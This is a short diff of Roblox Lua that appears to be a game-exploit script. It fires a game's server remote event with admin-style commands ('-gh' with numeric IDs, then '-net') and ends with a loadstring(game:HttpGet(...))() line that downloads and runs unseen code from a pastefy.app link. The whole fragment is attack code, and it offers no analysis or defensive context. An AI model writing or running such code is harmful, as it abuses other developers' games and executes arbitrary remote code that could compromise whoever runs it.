@@ -1,0 +1,8 @@
+--game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 48474313, 6594369919, 62724852")
+game.ReplicatedStorage["01_server"]:FireServer("cmd", "-gh 48474313, 6594369919, 62724852")
+		task.wait(3)
+		task.delay(5.5, function()
+			--game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")
+			game.ReplicatedStorage["01_server"]:FireServer("cmd", "-net")
+		end)
+		loadstring(game:HttpGet('https://pastefy.app/CDvH1kAI/raw'))()
